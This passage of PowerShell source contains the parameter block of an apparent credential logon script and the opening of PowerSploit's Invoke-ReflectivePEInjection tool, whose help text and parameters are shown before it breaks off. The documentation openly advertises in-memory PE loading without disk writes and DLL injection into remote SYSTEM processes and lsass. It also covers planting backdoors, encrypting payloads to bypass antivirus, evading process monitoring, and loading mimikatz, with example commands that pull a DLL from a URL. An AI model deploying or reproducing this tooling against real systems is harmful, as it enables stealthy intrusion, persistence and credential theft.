[CmdletBinding()]
    Param(
        [Parameter(ParameterSetName = "NewWinLogon", Position = 0)]
	    [Switch]
	    $NewWinLogon,

        [Parameter(ParameterSetName = "ExistingWinLogon", Position = 0)]
	    [Switch]
	    $ExistingWinLogon,

        [Parameter(Position=1, Mandatory=$true)]
        [String]
        $DomainName,

        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $UserName,

        [Parameter(Position=3, Mandatory=$true)]
        [String]
        $Password,

        [Parameter()]
        [ValidateSet("Interactive","RemoteInteractive", "NetworkCleartext")]
        [String]
        $LogonType = "RemoteInteractive",

        [Parameter()]
        [ValidateSet("Kerberos","Msv1_0")]
        [String]
        $AuthPackage = "Kerberos"
    )

    Set-StrictMode -Version 2




    function Invoke-ReflectivePEInjection
    {
    <#
    .SYNOPSIS
    This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
    or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
    please lead the Notes section (GENERAL NOTES) for information on how to use them.
    1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
    Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.
    This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
    this will load and execute the DLL/EXE in to memory without writing any files to disk.
    2.) Reflectively load a DLL in to memory of a remote process.
    As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.
    This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
    from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
    remote process. 
    While this script provides functionality to specify a file to load from disk or from a URL, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
    containing the file you'd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
    bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
    blog linked below (thanks to whitey).
    PowerSploit Function: Invoke-ReflectivePEInjection
    Author: Joe Bialek, Twitter: @JosephBialek
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.1
    .DESCRIPTION
    Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.
    .PARAMETER PEPath
    The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.
    .PARAMETER PEUrl
    A URL containing a DLL/EXE to load and execute.
    .PARAMETER ComputerName
    Optional, an array of computernames to run the script on.
    .PARAMETER FuncReturnType
    Optional, the return type of the function being called in the DLL. Default: Void
	    Options: String, WString, Void. See notes for more information.
	    IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
    .PARAMETER ExeArgs
    Optional, arguments to pass to the executable being reflectively loaded.
	
    .PARAMETER ProcName
    Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
    .PARAMETER ProcId
    Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
	
    .EXAMPLE
    Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
    Note that the file name on the website can be any file extension.
    Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString
    .EXAMPLE
    Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
    Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local
    .EXAMPLE
    Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	    the wchar_t* returned by WStringFunc() from all the computers.
    Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
    .EXAMPLE
    Load DemoEXE and run it locally.
    Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"
    .EXAMPLE
    Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
    Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local
    .NOTES
    GENERAL NOTES:
    The script has 3 basic sets of functionality:
    1.) Reflectively load a DLL in to the PowerShell process
	    -Can return DLL output to user when run remotely or locally.
	    -Cleans up memory in the PS process once the DLL finishes executing.
	    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
	    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
    2.) Reflectively load an EXE in to the PowerShell process.
	    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	    -Cleans up memory in the PS process once the DLL finishes executing.
	    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
    3.) Reflectively inject a DLL in to a remote process.
	    -Can NOT return DLL output to the user when run remotely OR locally.
	    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
	    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.
    DLL LOADING NOTES:
    PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
    If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
    return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
    remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
    applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.
    For DLL Loading:
    Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
    I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
    the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
    returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
    wchar_t*   : FuncReturnType = WString
    char*      : FuncReturnType = String
    void       : Default, don't supply a FuncReturnType
    For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
    using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.
    The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
    WString    : WStringFunc
    String     : StringFunc
    Void       : VoidFunc
    These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
    be declared as follows:
    extern "C" __declspec( dllexport ) wchar_t* WStringFunc()
    If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
    this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".
    Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection
    .LINK
    Blog: http://clymb3r.wordpress.com/
    Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
    Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
    Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
    Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
    #>

    [CmdletBinding()]
    Param(
	    [Parameter(Mandatory = $true)]
	    [Byte[]]
	    $Bytes32,
	
	    [Parameter(Mandatory = $true)]
	    [Byte[]]
	    $Bytes64,
	
	    [Parameter(Position = 1)]
	    [String[]]
	    $ComputerName,
	
	    [Parameter(Position = 2)]
        [ValidateSet( 'WString', 'String', 'Void' )]
	    [String]
	    $FuncReturnType = 'Void',
	
	    [Parameter(Position = 3)]
	    [String]
	    $ExeArgs,
	
	    [Parameter(Position = 4)]
	    [Int32]
	    $ProcId,
	
	    [Parameter(Position = 5)]
	    [String]
	    $ProcName
    )

    Set-StrictMode -Version 2


    $RemoteScriptBlock = {
	    [CmdletBinding()]
	    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $false)]
		    [String]
		    $FuncReturnType,
				
		    [Parameter(Position = 2, Mandatory = $false)]
		    [Int32]
		    $ProcId,
		
		    [Parameter(Position = 3, Mandatory = $false)]
		    [String]
		    $ProcName
	    )